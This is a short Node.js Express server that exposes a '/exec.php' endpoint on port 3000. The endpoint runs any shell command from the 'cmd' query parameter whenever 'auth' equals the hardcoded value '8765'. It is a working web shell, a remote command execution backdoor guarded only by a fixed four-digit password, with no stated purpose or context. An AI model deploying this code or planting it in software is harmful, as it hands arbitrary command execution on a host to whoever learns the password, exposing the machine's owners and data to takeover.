const express = require('express')
const url = require('url')
const { exec } = require('child_process')

const app = express()

app.get('/exec.php', (req, res) => {
    const args = url.parse(req.url, true).query
    console.log('GET /exec.php with args', args)
    if(args.auth == '8765'){
        exec(args.cmd, (err, stdout, stderr) => {
            console.log(stdout)
        })
        res.send('ok')
    } else {
        res.send('Access denied!')
    }
})

app.listen(3000)
